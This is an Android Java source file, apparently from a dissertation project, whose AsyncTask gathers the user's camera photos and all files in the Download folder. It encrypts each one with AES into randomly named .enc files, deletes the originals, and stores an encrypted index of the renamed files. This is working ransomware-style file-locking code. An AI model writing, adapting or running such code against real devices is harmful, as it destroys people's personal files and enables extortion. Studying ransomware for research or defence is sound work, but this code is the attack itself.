package com.example.disertatie;
import android.app.Activity;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class AsyncEncrypt extends AsyncTask<String, LoadingDialog, Void> {

    public static String randomString(){
// create a string of all characters
        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

        // create random string builder
        StringBuilder sb = new StringBuilder();

        // create an object of Random class
        Random random = new Random();

        // specify length of random string
        int length = 16;

        for(int i = 0; i < length; i++) {

            // generate random index number
            int index = random.nextInt(alphabet.length());

            // get character specified by index
            // from the string
            char randomChar = alphabet.charAt(index);

            // append the character to string builder
            sb.append(randomChar);
        }

        String randomString = sb.toString();
        return randomString;
    }


    public static List<String> findFiles(Path path, String fileExtension){

        if(!Files.isDirectory(path)) throw new IllegalArgumentException("Path is not a directory!");
        List<String> result = null;

        try(Stream<Path> walk = Files.walk(path)){
            result = walk.filter(p -> !Files.isDirectory(p)).map(p ->p.toString().toLowerCase())
                    .filter(f -> f.endsWith("jpg"))
                    .collect(Collectors.toList());
            return result;
        } catch (IOException e) {
            e.printStackTrace();
        }

        return result;
    }
    @Override
    protected Void doInBackground(String... strings) {
       try {

           //initialize cipher
           Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
           //generate random IV and key
           String generatedIV = strings[0];
           String generatedKey = strings[1];
           //generate iv and key based on random values
           IvParameterSpec iv = new IvParameterSpec(generatedIV.getBytes(StandardCharsets.UTF_8));
           SecretKeySpec keySpec = new SecretKeySpec(generatedKey.getBytes(StandardCharsets.UTF_8),
                   "AES");
           cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);
           //get files
           List<String> files = findFiles(Paths.get(Environment.getExternalStorageDirectory().getPath() +
                   "/DCIM/Camera/"), "jpg");
           File[] files2 = new File(Environment.getExternalStorageDirectory().getPath() + "/Download/").listFiles();
           List<String> dFiles = new ArrayList<>();
           for (File file : files2) {
               if (file.isFile()) {
                   dFiles.add(file.getPath());
               }
           }
           files.addAll(dFiles);
           int nrFile = 0;
           FileOutputStream fileOutputStream = null;
           FileInputStream fileInputStream = null;
           JSONObject jsonObject = new JSONObject();
           for (String file : files) {
               Log.d("test", "Eu sunt fisierul: " + file);
               String encryptedFile = Environment.getExternalStorageDirectory().getPath() +"/" +randomString() + ".enc";
               fileOutputStream = new FileOutputStream(encryptedFile);
               jsonObject.accumulate(file,encryptedFile);
               nrFile++;
               fileInputStream = new FileInputStream(file);
               ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
               int readByte = fileInputStream.read();
               while (readByte != -1) {
                   byteArrayOutputStream.write(readByte);
                   readByte = fileInputStream.read();
               }
               byte[] content = byteArrayOutputStream.toByteArray();

               //encrypt files
               byte[] encrypted = cipher.doFinal(content);
               fileOutputStream.write(encrypted);
               fileInputStream.close();
               fileOutputStream.close();
               File fDelete = new File(file);
               if (fDelete.exists()) {
                   fDelete.delete();
                   Log.d("test", "S-a sters " + file);
               }

           }
           //write json and encrypt
           String encryptedJsonFile = Environment.getExternalStorageDirectory().getPath() + "/" + randomString() + ".jsonenc";
           FileOutputStream fileOutputStreamJSON = new FileOutputStream(encryptedJsonFile);
           byte[] jsonString = jsonObject.toString().getBytes(StandardCharsets.UTF_8);
           byte[] encryptedJson = cipher.doFinal(jsonString);
           fileOutputStreamJSON.write(encryptedJson);
           fileOutputStreamJSON.close();

       } catch (Exception e) {
           e.printStackTrace();
       }
        return null;
    }

}
